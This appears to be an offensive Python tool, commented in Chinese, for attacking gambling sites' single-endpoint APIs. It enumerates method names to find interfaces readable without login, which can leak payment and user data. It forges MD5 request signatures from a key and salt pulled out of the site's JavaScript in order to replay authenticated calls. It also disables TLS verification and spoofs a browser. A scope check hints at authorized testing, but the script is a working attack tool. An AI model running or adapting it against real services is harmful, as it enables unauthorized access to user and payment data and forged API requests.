#!/usr/bin/env python3
"""API Dispatcher 方法名枚举 — 博彩站 /api.html 专项。

博彩站最通用攻击面之一：单点 dispatcher 模式
  /api.html?method=xxx
  /api.php?action=xxx
  /index.php?c=xxx&a=yyy

核心攻击逻辑：
  1. 枚举所有方法名 → 找到「匿名可读」接口
  2. 匿名接口往往泄露支付通道配置、用户数据、业务配置
  3. 有 AES key + sign salt → 离线重放任意已认证 API

示例:
  python3 炼蛊房/api_dispatcher_enum.py doctor
  python3 炼蛊房/api_dispatcher_enum.py scan \
    --base https://api.target.com/api.html --case <案卷>
  python3 炼蛊房/api_dispatcher_enum.py scan \
    --base https://api.target.com/api.html \
    --key 4523E51C8F78D3ED --salt FA72ACE1... \
    --token <用户token> --case <案卷>
  python3 炼蛊房/api_dispatcher_enum.py replay \
    --base https://api.target.com/api.html \
    --method playlist --key KEY --salt SALT --case <案卷>
"""
from __future__ import annotations
import argparse
import hashlib
import json
import sys
import time
import concurrent.futures
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "api_dispatcher"
    d.mkdir(parents=True, exist_ok=True)
    return d

# 方法"不存在"的指纹（需要过滤掉）
NOT_FOUND_PATTERNS = [
    "method 参数错误", "method error", "method not found",
    "invalid method", "方法不存在", "接口不存在",
    "action not found", "未知接口", "no such method",
    "parameter error", "param error",
]
# 认证失败指纹（方法存在但需要登录）
AUTH_REQUIRED_PATTERNS = [
    "请登录", "login required", "not logged", "unauthorized",
    "token", "invalid token", "expired", "未授权",
    "sign error", "签名错误", "sign fail",
]

def _load_methods(methods_file: str | None) -> list[str]:
    if methods_file and Path(methods_file).is_file():
        return [l.strip() for l in Path(methods_file).read_text(encoding="utf-8").splitlines()
                if l.strip() and not l.startswith("#")]
    default = ENGINE / "dict" / "gambling_api_methods.txt"
    if default.is_file():
        return [l.strip() for l in default.read_text(encoding="utf-8").splitlines()
                if l.strip() and not l.startswith("#")]
    return []

def _make_sign(method: str, salt: str, ts: str | None = None, extra: dict | None = None) -> tuple[str, str]:
    """构造常见博彩站 MD5 签名，返回 (timestamp, sign)。"""
    ts = ts or str(int(time.time()))
    parts = {"method": method, "timestamp": ts}
    if extra: parts.update(extra)
    parts["salt"] = salt
    query = "&".join(f"{k}={v}" for k, v in sorted(parts.items()))
    sign = hashlib.md5(query.encode()).hexdigest().upper()
    return ts, sign

def _call_method(sess, base: str, method: str, key: str, salt: str,
                 token: str, timeout: float) -> dict:
    """调用一个 API 方法，自动处理签名。"""
    params: dict = {"method": method}
    if salt:
        ts, sign = _make_sign(method, salt)
        params["timestamp"] = ts
        params["sign"] = sign
    if token:
        params["token"] = token
        sess.headers["token"] = token
        sess.headers["Authorization"] = f"Bearer {token}"
    try:
        r = sess.get(base, params=params, timeout=timeout)
        data: dict = {}
        try: data = r.json()
        except: data = {"_raw": r.text[:200]}
        return {
            "method": method,
            "status": r.status_code,
            "data": data,
            "raw": r.text[:500],
        }
    except Exception as e:
        return {"method": method, "status": -1, "error": str(e)}

def _classify(result: dict) -> str:
    """分类 API 响应：not_found / auth_required / accessible / error。"""
    text = json.dumps(result.get("data", {})).lower() + result.get("raw", "").lower()
    if any(p.lower() in text for p in NOT_FOUND_PATTERNS):
        return "not_found"
    if any(p.lower() in text for p in AUTH_REQUIRED_PATTERNS):
        return "auth_required"
    if result.get("status") == 200:
        data = result.get("data", {})
        code = data.get("code", data.get("status", -1))
        if str(code) in ("0", "200", "1"):
            return "accessible"
        if str(code) in ("-1", "1001", "1002", "401", "403"):
            return "auth_required"
    return "other"

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    methods = _load_methods(None)
    print(f"[ok] {len(methods)} methods in default dict")
    print("[ok] api_dispatcher_enum ready")
    return 0

def cmd_scan(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    methods = _load_methods(args.methods_file)
    if not methods:
        raise SystemExit("[err] 方法名字典为空")
    print(f"[*] scanning {len(methods)} API methods on {base}")
    print(f"    key={args.key!r}  salt={args.salt!r}  token={'yes' if args.token else 'no'}")

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"
    sess.headers["Content-Type"] = "application/x-www-form-urlencoded"

    results = {"accessible": [], "auth_required": [], "not_found": [], "other": []}

    def probe(method: str) -> dict:
        r = _call_method(sess, base, method, args.key, args.salt, args.token, args.timeout)
        r["class"] = _classify(r)
        return r

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futs = {pool.submit(probe, m): m for m in methods}
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            cls = r["class"]
            results[cls].append(r)
            if cls == "accessible":
                data = r.get("data", {})
                code = data.get("code", "?")
                print(f"  ★ [ACCESSIBLE] {r['method']:30s}  code={code}")
                # 显示返回的顶层 key
                if isinstance(data.get("data"), dict):
                    print(f"       keys={list(data['data'].keys())[:8]}")
                elif isinstance(data.get("data"), list):
                    print(f"       list[{len(data['data'])}]")
            elif cls == "auth_required":
                print(f"  + [AUTH_REQ]   {r['method']:30s}  (exists, needs login)")

    out = case_dir(args.case)
    out_json = out / "dispatcher_scan.json"
    out_json.write_text(json.dumps({"ts": _now(), "base": base,
                                    "results": results}, ensure_ascii=False, indent=2) + "\n",
                        encoding="utf-8")

    print("\n[result]")
    print(f"  ACCESSIBLE  : {len(results['accessible'])} (匿名可读 ★)")
    print(f"  AUTH_REQUIRED: {len(results['auth_required'])} (需要登录)")
    print(f"  NOT_FOUND   : {len(results['not_found'])}")
    print(f"  → {out_json}")

    if results["accessible"]:
        print("\n★★★ 匿名可读接口清单:")
        for r in results["accessible"]:
            print(f"  {r['method']}")
        print("\n[next] 对匿名接口逐一深挖：")
        print("  python3 炼蛊房/api_dispatcher_enum.py replay \\")
        print(f"    --base {base} --method playlist --key {args.key or 'KEY'} --salt {args.salt or 'SALT'} --case {args.case}")
    return 0 if results["accessible"] else 1

def cmd_replay(args: argparse.Namespace) -> int:
    """重放指定方法，完整显示响应，支持 POST body。"""
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0"

    extra = {}
    if args.extra:
        for pair in args.extra:
            k, _, v = pair.partition("=")
            extra[k.strip()] = v.strip()

    result = _call_method(sess, base, args.method, args.key, args.salt, args.token, 15.0)
    print(f"[method={args.method}]  status={result['status']}")
    try:
        print(json.dumps(result.get("data", {}), ensure_ascii=False, indent=2))
    except Exception:
        print(result.get("raw", ""))

    if args.case:
        out = case_dir(args.case) / f"replay_{args.method}.json"
        out.write_text(json.dumps({"ts": _now(), **result}, ensure_ascii=False, indent=2) + "\n",
                       encoding="utf-8")
        print(f"\n[+] → {out}")
    return 0

def main() -> int:
    p = argparse.ArgumentParser(description="API Dispatcher 方法名枚举（博彩站专项）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    sc = sub.add_parser("scan", help="批量枚举所有方法名")
    sc.add_argument("--base", required=True, help="如 https://api.target.com/api.html")
    sc.add_argument("--case", required=True)
    sc.add_argument("--key",  default="", help="AES KEY（从 js_secret_hunter 提取）")
    sc.add_argument("--salt", default="", help="Sign Salt")
    sc.add_argument("--token", default="", help="用户 token（测试已认证接口）")
    sc.add_argument("--methods-file", default="")
    sc.add_argument("--concurrency", type=int, default=20)
    sc.add_argument("--timeout", type=float, default=10.0)
    sc.set_defaults(func=cmd_scan)

    rp = sub.add_parser("replay", help="重放单个方法，完整显示响应")
    rp.add_argument("--base", required=True)
    rp.add_argument("--method", required=True)
    rp.add_argument("--key",  default="")
    rp.add_argument("--salt", default="")
    rp.add_argument("--token", default="")
    rp.add_argument("--extra", nargs="*", default=[],
                    help="额外参数 key=value，可多个")
    rp.add_argument("--case", default="")
    rp.set_defaults(func=cmd_replay)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
